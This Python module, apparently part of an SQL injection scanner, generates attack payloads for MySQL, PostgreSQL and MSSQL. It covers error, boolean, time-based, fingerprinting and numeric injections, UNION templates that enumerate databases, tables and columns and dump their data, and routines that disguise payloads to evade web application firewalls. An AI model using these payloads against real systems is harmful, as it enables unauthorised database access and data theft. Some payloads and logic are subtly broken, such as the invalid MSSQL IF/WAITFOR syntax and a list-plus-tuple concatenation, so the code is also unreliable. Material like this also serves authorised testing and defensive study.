# scanner/payloads.py
import random
import string
from urllib.parse import quote

class PayloadGenerator:
    """Advanced payload generation with context-aware, DBMS-specific, and WAF bypass payloads"""
    
    def __init__(self):
        # Error-based payloads
        self.error_payloads = {
            "mysql": [
                "' AND extractvalue(1,concat(0x7e,(select @@version)))-- -",
                "' AND updatexml(1,concat(0x7e,(select user())),1)-- -",
                "' UNION SELECT 1,2,3-- -",
            ],
            "postgresql": [
                "' AND 1=cast((select version()) as int)-- -",
                "' AND 1=cast((select current_user) as int)-- -",
                "'; SELECT 1; --",
            ],
            "mssql": [
                "' AND 1=cast((select @@version) as int)-- -",
                "' AND 1=cast((select user) as int)-- -",
                "'; SELECT 1; --",
            ],
            "generic": [
                "' OR 1=1-- -",
                "' OR '1'='1",
                "admin' --",
                "' AND 1=1-- -",
                "' AND 1=2-- -",
            ]
        }
        
        # Boolean-based payloads (True/False detection)
        self.boolean_payloads = {
            "mysql": [
                ("' AND 1=1-- -", "' AND 1=2-- -"),
                ("' AND 'a'='a", "' AND 'a'='b"),
                ("' AND sleep(0)-- -", "' AND sleep(5)-- -"),
            ],
            "postgresql": [
                ("' AND 1=1-- -", "' AND 1=2-- -"),
                ("' AND 'a'='a", "' AND 'a'='b"),
                ("' AND pg_sleep(0)-- -", "' AND pg_sleep(5)-- -"),
            ],
            "mssql": [
                ("' AND 1=1-- -", "' AND 1=2-- -"),
                ("' AND 'a'='a", "' AND 'a'='b"),
                ("' AND WAITFOR DELAY '00:00:00'-- -", "' AND WAITFOR DELAY '00:00:05'-- -"),
            ],
            "generic": [
                ("' AND 1=1-- -", "' AND 1=2-- -"),
                ("' OR '1'='1", "' OR '1'='2"),
            ]
        }
        
        # Time-based payloads (Blind SQLi)
        self.time_payloads = {
            "mysql": [
                "' AND SLEEP(5)-- -",
                "' OR SLEEP(5)-- -",
                "' AND IF(1=1,SLEEP(5),0)-- -",
                "' AND IF(1=2,SLEEP(5),0)-- -",
            ],
            "postgresql": [
                "' AND pg_sleep(5)-- -",
                "' OR pg_sleep(5)-- -",
                "' AND (CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
                "' AND (CASE WHEN 1=2 THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
            ],
            "mssql": [
                "' AND WAITFOR DELAY '00:00:05'-- -",
                "' OR WAITFOR DELAY '00:00:05'-- -",
                "' AND IF(1=1,WAITFOR DELAY '00:00:05')-- -",
                "' AND IF(1=2,WAITFOR DELAY '00:00:05')-- -",
            ]
        }
        
        # DBMS Fingerprinting payloads
        self.fingerprint_payloads = {
            "mysql": [
                "' AND @@version-- -",
                "' AND SLEEP(5)-- -",
                "' UNION SELECT 1,@@version,3-- -",
            ],
            "postgresql": [
                "' AND version()-- -",
                "' AND pg_sleep(5)-- -",
                "' UNION SELECT 1,version(),3-- -",
            ],
            "mssql": [
                "' AND @@version-- -",
                "' AND WAITFOR DELAY '00:00:05'-- -",
                "' UNION SELECT 1,@@version,3-- -",
            ]
        }
        
        # Data extraction payloads (blind extraction with SUBSTR/SUBSTRING)
        self.extraction_payloads = {
            "mysql": {
                "databases": "UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -",
                "tables": "UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='{db}'-- -",
                "columns": "UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='{table}'-- -",
                "data": "UNION SELECT 1,GROUP_CONCAT(CONCAT({cols})),3 FROM {table} LIMIT {limit}-- -",
                "char_extraction": "' AND SUBSTR((SELECT {col} FROM {table} LIMIT 1),{pos},1)=CHAR({ascii})-- -",
            },
            "postgresql": {
                "databases": "UNION SELECT 1,string_agg(datname,','),3 FROM pg_database-- -",
                "tables": "UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='{db}'-- -",
                "columns": "UNION SELECT 1,string_agg(attname,','),3 FROM pg_attribute WHERE attrelid=(SELECT oid FROM pg_class WHERE relname='{table}')-- -",
                "data": "UNION SELECT 1,string_agg({cols},','),3 FROM {table} LIMIT {limit}-- -",
                "char_extraction": "' AND SUBSTR((SELECT {col} FROM {table} LIMIT 1),{pos},1)=CHR({ascii})-- -",
            },
            "mssql": {
                "databases": "UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.databases-- -",
                "tables": "UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.tables WHERE database_id=DB_ID('{db}')-- -",
                "columns": "UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.columns WHERE object_id=OBJECT_ID('{table}')-- -",
                "data": "UNION SELECT 1,STRING_AGG({cols},','),3 FROM {table}-- -",
                "char_extraction": "' AND SUBSTRING((SELECT {col} FROM {table}),{pos},1)=CHAR({ascii})-- -",
            }
        }

    def get_payloads(self, payload_type="all", dbms="generic", for_numeric=False, waf_bypass=False):
        """
        Get payloads of specific type
        Types: error, boolean, time, fingerprint, extraction, all
        """
        if payload_type == "error":
            payloads = self.error_payloads.get(dbms, self.error_payloads["generic"])
        elif payload_type == "boolean":
            payloads = self.boolean_payloads.get(dbms, self.boolean_payloads["generic"])
        elif payload_type == "time":
            payloads = self.time_payloads.get(dbms, self.time_payloads["mysql"])
        elif payload_type == "fingerprint":
            payloads = self.fingerprint_payloads.get(dbms, [])
        elif payload_type == "extraction":
            return self.extraction_payloads.get(dbms, self.extraction_payloads["mysql"])
        else:
            # Return all payloads
            error = self.error_payloads.get(dbms, self.error_payloads["generic"])
            boolean = self.boolean_payloads.get(dbms, self.boolean_payloads["generic"])
            time_based = self.time_payloads.get(dbms, [])
            
            payloads = error + (boolean[0] if isinstance(boolean, list) and len(boolean) > 0 else []) + time_based
        
        # For numeric parameters, remove string delimiters
        if for_numeric:
            if isinstance(payloads, list):
                payloads = [p.replace("'", "").replace('"', "") if isinstance(p, str) else p for p in payloads]
            elif isinstance(payloads, str):
                payloads = payloads.replace("'", "").replace('"', "")
        
        # Apply WAF bypass techniques
        if waf_bypass and isinstance(payloads, list):
            payloads = [self._apply_waf_bypass(p) if isinstance(p, str) else p for p in payloads]
        elif waf_bypass and isinstance(payloads, str):
            payloads = self._apply_waf_bypass(payloads)
        
        return payloads if isinstance(payloads, list) else [payloads]

    def _apply_waf_bypass(self, payload):
        """Apply common WAF bypass techniques"""
        methods = [
            self._inline_comments,
            self._case_randomization,
            self._whitespace_variation,
        ]
        return random.choice(methods)(payload)

    def _inline_comments(self, payload):
        """Add inline comments /**/ to bypass WAF"""
        # Replace spaces with /**/ in critical parts
        keywords = ["select", "union", "from", "where", "and", "or"]
        for kw in keywords:
            payload = payload.replace(kw, f"{kw}/**/")
        return payload

    def _case_randomization(self, payload):
        """Randomize case of SQL keywords"""
        keywords = ["select", "union", "from", "where", "and", "or", "sleep", "char", "substr"]
        for kw in keywords:
            case_variant = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
            payload = payload.replace(kw, case_variant)
        return payload

    def _whitespace_variation(self, payload):
        """Add tabs and newlines instead of spaces"""
        payload = payload.replace(" ", random.choice(["\t", "\n", "/**/", "/*\n*/"]))
        return payload

    def get_numeric_payloads(self, dbms="mysql"):
        """Get payloads specifically for numeric parameters"""
        numeric_payloads = {
            "mysql": [
                "1 OR 1=1",
                "1 AND 1=1",
                "1 UNION SELECT 1,2,3",
                "1 AND SLEEP(5)",
                "1 OR SLEEP(5)",
            ],
            "postgresql": [
                "1 OR 1=1-- -",
                "1 AND 1=1-- -",
                "1 UNION SELECT 1,2,3-- -",
                "1 AND pg_sleep(5)-- -",
            ],
            "mssql": [
                "1 OR 1=1-- -",
                "1 AND 1=1-- -",
                "1 UNION SELECT 1,2,3-- -",
                "1 AND WAITFOR DELAY '00:00:05'-- -",
            ]
        }
        return numeric_payloads.get(dbms, numeric_payloads["mysql"])

    def get_extraction_query(self, dbms, extraction_type, **kwargs):
        """Get specific extraction query with parameters filled in"""
        queries = self.extraction_payloads.get(dbms, self.extraction_payloads["mysql"])
        query = queries.get(extraction_type, "")
        
        # Format with provided parameters
        for key, value in kwargs.items():
            query = query.replace(f"{{{key}}}", value)
        
        return query